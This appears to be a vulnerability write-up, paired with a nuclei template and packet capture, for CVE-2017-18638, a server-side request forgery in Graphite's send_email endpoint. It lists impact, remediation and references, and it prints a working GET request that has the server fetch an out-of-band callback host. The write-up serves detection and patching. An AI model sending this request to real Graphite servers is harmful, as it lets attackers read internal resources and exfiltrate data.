---
layout: post
cve_id: CVE-2017-18638
title: Graphite <=1.1.5 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2017/CVE-2017-18638.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-18638.yaml
snort2_rule: N/A
snort3_rule: N/A
author: huowuzhao
severity: high
impact: 'An attacker can exploit this vulnerability to access internal resources,
  potentially leading to unauthorized access, data leakage, or further attacks.

  '
remediation: 'Upgrade to a patched version of Graphite (>=1.1.6) or apply the necessary
  security patches.

  '
reference:
- http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
- https://github.com/graphite-project/graphite-web/issues/2008
- https://github.com/advisories/GHSA-vfj6-275q-4pvm
- https://nvd.nist.gov/vuln/detail/CVE-2017-18638
- https://github.com/graphite-project/graphite-web/pull/2499
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2017-18638
  cwe-id: CWE-918
  epss-score: 0.90804
  epss-percentile: 0.99602
  cpe: cpe:2.3:a:graphite_project:graphite:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: graphite_project
  product: graphite
tags:
- cve
- cve2017
- graphite
- ssrf
- oast
- graphite_project
- vuln
---

## üîç Vulnerability Description
Graphite's send_email in graphite-web/webapp/graphite/composer/views.py in versions up to 1.1.5 is vulnerable to server-side request forgery (SSR)F. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an email address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information.


## üåê HTTP Request
```nohighlight
GET /composer/send_email?to=rMCQ@NfoX&url=http://d5j0rrhle0o2j41q9eigssrhd7qb3p9aw.oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

